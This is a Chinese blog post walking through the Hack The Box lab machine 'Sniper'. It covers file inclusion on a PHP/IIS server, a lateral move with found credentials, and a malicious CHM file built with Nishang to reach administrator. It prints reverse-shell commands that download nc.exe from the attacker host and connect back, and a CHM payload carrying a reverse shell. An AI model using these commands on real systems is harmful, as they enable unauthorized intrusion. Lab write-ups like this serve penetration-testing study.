> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9AB8GSrpqKzbRpwqtQy78A)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **90** 篇文章，本公众号会每日分享攻防渗透技术给大家。

靶机地址：https://www.hackthebox.eu/home/machines/profile/211

靶机难度：中级（4.5/10）

靶机发布日期：2020 年 3 月 24 日

靶机描述：

Sniper is a medium difficulty Windows machine which features a PHP server. The server hosts a

file that is found vulnerable to local and remote file inclusion. Command execution is gained on

the server in the context of NT AUTHORITY\iUSR via local inclusion of maliciously crafted PHP

Session files. Exposed database credentials are used to gain access as the user Chris , who has

the same password. Enumeration reveals that the administrator is reviewing CHM (Compiled

HTML Help) files, which can be used the leak the administrators NetNTLM-v2 hash. This can be

captured, cracked and used to get a reverse shell as administrator using a PowerShell credential

object.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

  

  

  

一、信息收集

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQENeBE1ibLibsos7MmibJjb8mSiaaxOjEhY8mpvujziaDvWicx7Q36MZaribiaA/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.151....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQvyibibc9o2xRuHsVnKhdZCZM8HFQlgklSK2EGPkRgFiaRtVm6M7OSNUMA/640?wx_fmt=png)

nmap 扫描发现运行着 IIS Web 服务器... 

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQva8hmsIxibQbYD0Ll380ibYaqJjZj3uhxQJ0yZD03ichyIqhsJnznxOhw/640?wx_fmt=png)

该网站属于 Sniper Co. 公司... 都是公司的博客等信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQYxQV4356LKCf0bmCDibZIn4zCOSAdVrdgj5rbEIXmQ5w0diaPQ942GXA/640?wx_fmt=png)

```
gobuster dir -w /usr/share/wfuzz/wordlist/general/common.txt -t 20 -x php,html -u http://10.10.10.151/
```

目录爆破发现了一些目录或者文件... 挖掘

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQOsa0cWSAGWVJciazDeQyKmxV4YDkGibNVm05KsnnUCk53cpnESvO0Raw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQyo1kice8RnYKicbfLJB3KrRzgOOpSuETPsSvTFyrlqx0DtdfNAUxfI3g/640?wx_fmt=png)

当点击 English 后，重定向到了 blog-en.php 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQoeZpOZ218OTeckeibpib4x0xEj0diaicibU7ER36AZbIN4TUzdDYcoNcX5Q/640?wx_fmt=png)

通过测试... 发现单独创建的独立用户 smb 共享，靶机无法共享到 webshell 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQLg9lHyxNEDKvOoicO2QRVLIaCwIiaVChRPUB7wTt8COCJFa6HEDUqNoQ/640?wx_fmt=png)

这里创建对所有人开放的 SMB 共享...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQbia9kxUdgpNpZvBqHQRVWSiahvcfQuMQophppQHadLhA7z5WvtRI0Aiaw/640?wx_fmt=png)

通过所有人可访问的共享，测试了查询结果，是正常的... 直接反弹 shell 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQbWjETnPuvFIO23ja1CkT5cS20Dg1PCIJYLnicnicoziczjPXUHJNhBxgA/640?wx_fmt=png)

```
powershell.exe mkdir /dayu; iwr -uri http://10.10.14.51/nc.exe -outfile /dayu/nc.exe; /dayu/nc.exe 10.10.14.51 6666 -e powershell.exe
```

通过 web shell 共享上传了 NC，利用 NC 反弹 shell 获得了低权外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQbxxGvKKINh0prqngpnVsSBKYzNezBysdGcS0GicwbO2I200IfQotbCg/640?wx_fmt=png)

枚举后，在页面底层发现了 chris 的密码凭证...

那后续只需要 Powershell 变量，触发 nc 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQ8o2W3f084DED5Fyo8S9tVsBMfmeVfjAtnDF4JWs0CATnxseJ0yOJlw/640?wx_fmt=png)

```
$pw = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("snipe\chris", $pw)
Enter-PSSession -ComputerName SNIPER -Credential $cred
Start-Process -FilePath "\dayu\nc.exe" -ArgumentList "10.10.14.51 7778 -e cmd.exe" -NoNewWindow
```

通过修改 powershell 变量，成功通过 chris 用户利用 nc 进行反弹 shell...  

获得 user 信息...

这里也可以密匙凭证登陆 mysql 在底层可以看到 passwd 哈希值，破解即可获得 chris 密码...

或者通过 winRM.rb 使用密匙凭证登陆到 chris 用户下... 方法很多...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQfNpV2Z4bjrj5ms9r0ddla7aOWRgkswdiaichOLJSGzEffKX0xOSTqaOQ/640?wx_fmt=png)

这里说到 Chris 很生气... 这里的 php 不好用，出现了很多问题，该公司的首席执行官正在寻找一个应用程序文档文件，并将在此文件夹中寻找它...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQv00s9YxHOjx8icboccALTPywhoZL9sBoeicwSXvobtgJgic4rkZofvPVA/640?wx_fmt=png)

我在 chris 用户的下载目录下发现了. chm 文件...chm 文件是已编译的 HTML 文件，前面的语言说明管理员可能期望使用 chm 文件放置在 C:\Docs \ 中，利用此漏洞，我们可以创建一个包含 UNC 链接的新 chm 文件，触发该文件打开时连接到本地服务器，这可以窃取管理员 NetNTLMv2 哈希值...GO

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQMnnlva925cTLlovuiaicE7pibicnKt0TMknKKQWE69P8JZsU9B3MAaOgOQ/640?wx_fmt=png)

这里利用 nishang 里的 chm 脚本进行...

```
[地址](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQalaZwkOhaDz80Jnq32wKFCJOuTOcNf0G1qV6LJm6lzfrmbEVhHNmJg/640?wx_fmt=png)

安装：

```
[HTML Help Workshop](https://www.microsoft.com/en-us/download/confirmation.aspx?id=21138)
```

需要此工具进行编辑 chm....

下面开始简单利用 powershell 运行脚本，脚本会将有效负载注入有效的 chm 格式中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQL1gG8zDj5PI8wxly68Z1BvHzCFNwicxIwJp23neXMXiajWfeOAqNkInQ/640?wx_fmt=png)

记得管理员模式下运行 powershell：set-ExecutionPolicy RemoteSigned，否则无法运行脚本！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQhvd5NCr2OEZoIlXGW4vgic6y7FIxl2D9C3ROcvt0pn9mR4eiaEefEx5w/640?wx_fmt=png)

```
./Out-CHM.ps1
Import-Module ./Out-CHM.ps1
out-chm -Payload "powershell c:\dayu\nc.exe 10.10.14.51 9999 -e powershell" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

使用命令导入 Powershell 模块，成功利用 powershell 链接 HTML 创建了 chm 恶意程序...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQIZ37ZzBRKlgkEkYrjrqupXfiah9MJbIluwb9IlC9p2xAt0YlsFwOcdQ/640?wx_fmt=png)

```
Invoke-WebRequest "http://10.10.14.51/doc.chm" -Outfile c:\Docs\doc.chm
```

上传，通过前面写入的 shell，利用 nc 进行成功提权... 获得了 root 信息... 或者通过：

```
https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7
```

介绍的编辑也提到 administrator...  

或者可以通过编辑 HTML Help Workshop--hhw 进行生成恶意 CHM 也是一样的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQrrBauTm8Nsgo4EkJu0wUWjIZUrcUk9iaWlW39ibpLAJKJGQzhvEnOQkw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQrcmfpe09sD6kNUlvfBEX51TfgOSk55k0zo27Jb2hGndOiaXID8aJD5A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZ8UhNt3f2ko5bcJXzHKaQKRuuYzVngibx81ehgoKyr5J4PrurWgPP7DT5AQbp1ibW9hb9MnuVQFfw/640?wx_fmt=png)

这里介绍了 HTML--hhw 的使用方法...

直接创建 shell 利用 NC 提权也行... 方法很多，或者利用 SMB 共享读取到密匙凭证登陆时候的哈希值爆破获得管理员密码... 等等... 就不介绍下去了..

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成这台中等的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)